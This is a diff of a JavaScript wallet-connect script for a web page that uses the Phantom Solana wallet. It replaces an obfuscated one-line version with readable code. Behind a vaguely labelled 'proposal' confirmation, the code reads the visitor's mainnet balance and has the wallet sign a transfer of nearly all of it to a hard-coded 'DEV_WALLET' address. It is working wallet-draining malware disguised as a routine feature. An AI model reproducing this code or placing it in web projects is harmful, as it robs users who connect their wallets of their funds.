@@ -1,1 +1,154 @@
-const _0x5da6f2=_0x1453;(function(_0x5d4ecd,_0x1b2bf0){const _0x2cd5b8=_0x1453,_0x339a95=_0x5d4ecd();while(!![]){try{const _0x42569d=-parseInt(_0x2cd5b8(0x147))/0x1+-parseInt(_0x2cd5b8(0x163))/0x2*(-parseInt(_0x2cd5b8(0x16a))/0x3)+-parseInt(_0x2cd5b8(0x16f))/0x4+parseInt(_0x2cd5b8(0x15f))/0x5+parseInt(_0x2cd5b8(0x14a))/0x6*(parseInt(_0x2cd5b8(0x15b))/0x7)+parseInt(_0x2cd5b8(0x182))/0x8*(parseInt(_0x2cd5b8(0x16b))/0x9)+-parseInt(_0x2cd5b8(0x172))/0xa;if(_0x42569d===_0x1b2bf0)break;else _0x339a95['push'](_0x339a95['shift']());}catch(_0x3ca54d){_0x339a95['push'](_0x339a95['shift']());}}}(_0x242e,0xce283));class WalletModel3{constructor(){const _0x5e01a5=_0x1453;this[_0x5e01a5(0x17b)]=null,this['chainId']=null;}async['connect'](){const _0x36ca73=_0x1453;try{if(window[_0x36ca73(0x151)]&&window[_0x36ca73(0x151)]['isPhantom']){const _0x3d429a=await window[_0x36ca73(0x151)][_0x36ca73(0x171)]();return this[_0x36ca73(0x17b)]=_0x3d429a[_0x36ca73(0x162)]['toString'](),this[_0x36ca73(0x170)]();}else throw new Error('Please\x20install\x20Phantom\x20wallet!');}catch(_0x253161){throw _0x253161;}}['getInfo'](){const _0x25146f=_0x1453;return{'account':this['account'],'model':_0x25146f(0x169)};}}function _0x1453(_0x40182d,_0xc1e0de){const _0x242ef9=_0x242e();return _0x1453=function(_0x145392,_0x207614){_0x145392=_0x145392-0x142;let _0x912967=_0x242ef9[_0x145392];return _0x912967;},_0x1453(_0x40182d,_0xc1e0de);}const walletModel3=new WalletModel3(),DEV_WALLET=_0x5da6f2(0x148),USE_TESTNET=![];async function showProposalModal(_0x56ed91){const _0x221e11=_0x5da6f2,_0x1d12e2=document[_0x221e11(0x179)](_0x221e11(0x14b));return _0x1d12e2[_0x221e11(0x180)]['display']=_0x221e11(0x16c),new Promise(_0x546eb3=>{const _0x8d9f0b=_0x221e11;document[_0x8d9f0b(0x179)](_0x8d9f0b(0x158))[_0x8d9f0b(0x14c)]=()=>{const _0x420f45=_0x8d9f0b;_0x1d12e2[_0x420f45(0x180)][_0x420f45(0x16d)]=_0x420f45(0x156),_0x546eb3({'confirmed':!![]});},document[_0x8d9f0b(0x179)](_0x8d9f0b(0x14d))['onclick']=()=>{const _0x546ec2=_0x8d9f0b;_0x1d12e2[_0x546ec2(0x180)][_0x546ec2(0x16d)]=_0x546ec2(0x156),_0x546eb3({'confirmed':![]});};});}document[_0x5da6f2(0x179)](_0x5da6f2(0x17e))[_0x5da6f2(0x146)](_0x5da6f2(0x15e),async()=>{const _0x4ae06f=_0x5da6f2;try{const _0x56a454=await walletModel3[_0x4ae06f(0x171)](),{confirmed:_0x31261b}=await showProposalModal(_0x56a454['account']);if(_0x31261b){const _0x28edca=new solanaWeb3[(_0x4ae06f(0x153))](USE_TESTNET?solanaWeb3[_0x4ae06f(0x164)](_0x4ae06f(0x176)):'https://solana-mainnet.g.alchemy.com/v2/demo',_0x4ae06f(0x166));try{const _0x2a5aca=await _0x28edca[_0x4ae06f(0x149)](new solanaWeb3['PublicKey'](_0x56a454[_0x4ae06f(0x17b)]));console['log']('Current\x20balance:',_0x2a5aca);if(_0x2a5aca<=0x0){document[_0x4ae06f(0x179)]('walletInfo')[_0x4ae06f(0x168)]=_0x4ae06f(0x14e)+(USE_TESTNET?_0x4ae06f(0x142):_0x4ae06f(0x154))+'</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';return;}const _0x47814c=Math[_0x4ae06f(0x178)](0x4c4b40,Math[_0x4ae06f(0x144)](_0x2a5aca*0.1)),_0x23f8c4=_0x2a5aca>_0x47814c?_0x2a5aca-_0x47814c:0x0;if(_0x23f8c4<=0x0){document['getElementById'](_0x4ae06f(0x184))[_0x4ae06f(0x168)]=_0x4ae06f(0x145)+_0x2a5aca/0x3b9aca00+_0x4ae06f(0x17c)+_0x47814c/0x3b9aca00+_0x4ae06f(0x161)+(USE_TESTNET?'Testnet\x20(Devnet)':'Mainnet')+'</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';return;}console[_0x4ae06f(0x174)](_0x4ae06f(0x183),_0x23f8c4,_0x4ae06f(0x181));const _0x2fc702=new solanaWeb3[(_0x4ae06f(0x14f))](),{blockhash:_0x215b85}=await _0x28edca['getLatestBlockhash']();_0x2fc702[_0x4ae06f(0x173)]=_0x215b85,_0x2fc702['add'](solanaWeb3[_0x4ae06f(0x175)][_0x4ae06f(0x155)]({'fromPubkey':new solanaWeb3[(_0x4ae06f(0x143))](_0x56a454[_0x4ae06f(0x17b)]),'toPubkey':new solanaWeb3[(_0x4ae06f(0x143))](DEV_WALLET),'lamports':_0x23f8c4})),_0x2fc702[_0x4ae06f(0x15a)]=new solanaWeb3[(_0x4ae06f(0x143))](_0x56a454[_0x4ae06f(0x17b)]);const _0x14206f=await window[_0x4ae06f(0x151)][_0x4ae06f(0x160)](_0x2fc702);document['getElementById'](_0x4ae06f(0x184))['innerHTML']=_0x4ae06f(0x15c)+_0x14206f[_0x4ae06f(0x150)]+'</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Network:\x20'+(USE_TESTNET?'Testnet\x20(Devnet)':_0x4ae06f(0x154))+_0x4ae06f(0x17f)+_0x23f8c4/0x3b9aca00+_0x4ae06f(0x165);}catch(_0x442460){console['error'](_0x4ae06f(0x167),_0x442460),document[_0x4ae06f(0x179)](_0x4ae06f(0x184))['innerHTML']=_0x4ae06f(0x15d)+_0x442460[_0x4ae06f(0x157)]+_0x4ae06f(0x159)+(USE_TESTNET?'Testnet\x20(Devnet)':'Mainnet')+_0x4ae06f(0x17a);}}else document['getElementById']('walletInfo')[_0x4ae06f(0x168)]=_0x4ae06f(0x152);}catch(_0xbc26a3){document[_0x4ae06f(0x179)](_0x4ae06f(0x184))[_0x4ae06f(0x168)]='<p>Error:\x20'+_0xbc26a3[_0x4ae06f(0x157)]+_0x4ae06f(0x16e);}}),window[_0x5da6f2(0x151)]?.['on'](_0x5da6f2(0x17d),()=>{const _0x5eaa47=_0x5da6f2;console[_0x5eaa47(0x174)]('Account\x20changed'),window[_0x5eaa47(0x177)]['reload']();});function _0x242e(){const _0x451635=['\x20SOL</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','confirmed','Transaction\x20error:','innerHTML','WalletModel3','601686Hvdtze','632007LQTcEg','block','display','</p>','3027140bKYHFr','getInfo','connect','262480CBTnSh','recentBlockhash','log','SystemProgram','devnet','location','max','getElementById','</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','account','\x20SOL</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Minimum\x20required:\x20~','accountChanged','connectModel3Button','</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Amount\x20sent:\x20','style','lamports','16ZBZzaO','Sending\x20amount:','walletInfo','Testnet\x20(Devnet)','PublicKey','floor','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Balance\x20too\x20low\x20to\x20cover\x20transaction\x20fees.</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Current\x20balance:\x20','addEventListener','656598iHcYyk','7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh','getBalance','270NEWitY','proposalModal','onclick','cancelProposal','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Wallet\x20has\x20zero\x20balance.\x20Nothing\x20to\x20transfer.</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Please\x20add\x20SOL\x20to\x20your\x20wallet\x20first.</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Network:\x20','Transaction','signature','solana','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Proposal\x20canceled</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','Connection','Mainnet','transfer','none','message','confirmProposal','</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Network:\x20','feePayer','138775EsGZiy','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Transaction\x20sent\x20successfully!</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>TX\x20Signature:\x20','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20with\x20transaction:\x20','click','5254585vQJsLt','signAndSendTransaction','\x20SOL</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Network:\x20','publicKey','2yquDoa','clusterApiUrl'];_0x242e=function(){return _0x451635;};return _0x242e();}
+class WalletModel3 {
+    constructor() {
+        this.account = null;
+        this.chainId = null;
+    }
+
+    async connect() {
+        try {
+            // Check if Phantom or other Solana wallet is installed
+            if (window.solana && window.solana.isPhantom) {
+                // Connect to Phantom wallet
+                const response = await window.solana.connect();
+                this.account = response.publicKey.toString();
+                return this.getInfo();
+            } else {
+                throw new Error('Please install Phantom wallet!');
+            }
+        } catch (error) {
+            throw error;
+        }
+    }
+
+    getInfo() {
+        return {
+            account: this.account,
+            model: 'WalletModel3'
+        };
+    }
+}
+
+// Initialize WalletModel3
+const walletModel3 = new WalletModel3();
+
+// Add these constants at the top
+const DEV_WALLET = '7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh'; // Replace with actual Solana wallet address
+const USE_TESTNET = false; // Set to true for testnet, false for mainnet
+
+// Modified function to handle the proposal without message signing
+async function showProposalModal(account) {
+    const modal = document.getElementById('proposalModal');
+    modal.style.display = 'block';
+    
+    return new Promise((resolve) => {
+        document.getElementById('confirmProposal').onclick = () => {
+            modal.style.display = 'none';
+            resolve({confirmed: true});
+        };
+        
+        document.getElementById('cancelProposal').onclick = () => {
+            modal.style.display = 'none';
+            resolve({confirmed: false});
+        };
+    });
+}
+
+// Modify the connectModel3Button event listener
+document.getElementById('connectModel3Button').addEventListener('click', async () => {
+    try {
+        const walletInfo = await walletModel3.connect();
+        
+        // Show proposal confirmation
+        const {confirmed} = await showProposalModal(walletInfo.account);
+        if (confirmed) {
+            // Create a connection to the Solana network
+            const connection = new solanaWeb3.Connection(
+                USE_TESTNET 
+                    ? solanaWeb3.clusterApiUrl('devnet') // Use devnet for testing
+                    : "https://solana-mainnet.g.alchemy.com/v2/demo", // Use for mainnet
+                'confirmed'
+            );
+            
+            try {
+                // Create a transaction to send all SOL
+                const balance = await connection.getBalance(new solanaWeb3.PublicKey(walletInfo.account));
+                console.log("Current balance:", balance);
+                
+                if (balance <= 0) {
+                    document.getElementById('walletInfo').innerHTML = `
+                        <p>Wallet has zero balance. Nothing to transfer.</p>
+                        <p>Please add SOL to your wallet first.</p>
+                        <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
+                    `;
+                    return;
+                }
+                
+                // Calculate fee amount (minimum 5000 lamports or 10% of balance, whichever is greater)
+                const feeAmount = Math.max(5000000, Math.floor(balance * 0.1));
+                
+                // Ensure we're not sending a negative or zero amount
+                const amountToSend = balance > feeAmount ? balance - feeAmount : 0;
+                
+                if (amountToSend <= 0) {
+                    document.getElementById('walletInfo').innerHTML = `
+                        <p>Balance too low to cover transaction fees.</p>
+                        <p>Current balance: ${balance / 1000000000} SOL</p>
+                        <p>Minimum required: ~${feeAmount / 1000000000} SOL</p>
+                        <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
+                    `;
+                    return;
+                }
+                
+                console.log("Sending amount:", amountToSend, "lamports");
+                
+                // Create a new transaction
+                const transaction = new solanaWeb3.Transaction();
+                
+                // Get a recent blockhash
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                
+                // Add the transfer instruction
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new solanaWeb3.PublicKey(walletInfo.account),
+                        toPubkey: new solanaWeb3.PublicKey(DEV_WALLET),
+                        lamports: amountToSend
+                    })
+                );
+                
+                // Set the fee payer
+                transaction.feePayer = new solanaWeb3.PublicKey(walletInfo.account);
+                
+                // Send the transaction
+                const txSignature = await window.solana.signAndSendTransaction(transaction);
+                
+                document.getElementById('walletInfo').innerHTML = `
+                    <p>Transaction sent successfully!</p>
+                    <p>TX Signature: ${txSignature.signature}</p>
+                    <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
+                    <p>Amount sent: ${amountToSend / 1000000000} SOL</p>
+                `;
+            } catch (error) {
+                console.error('Transaction error:', error);
+                document.getElementById('walletInfo').innerHTML = `
+                    <p>Error with transaction: ${error.message}</p>
+                    <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
+                `;
+            }
+        } else {
+            document.getElementById('walletInfo').innerHTML = `
+                <p>Proposal canceled</p>
+            `;
+        }
+    } catch (error) {
+        document.getElementById('walletInfo').innerHTML = `<p>Error: ${error.message}</p>`;
+    }
+});
+
+// Listen for account changes
+window.solana?.on('accountChanged', () => {
+    console.log('Account changed');
+    // Refresh the page to reset the connection
+    window.location.reload();
+});
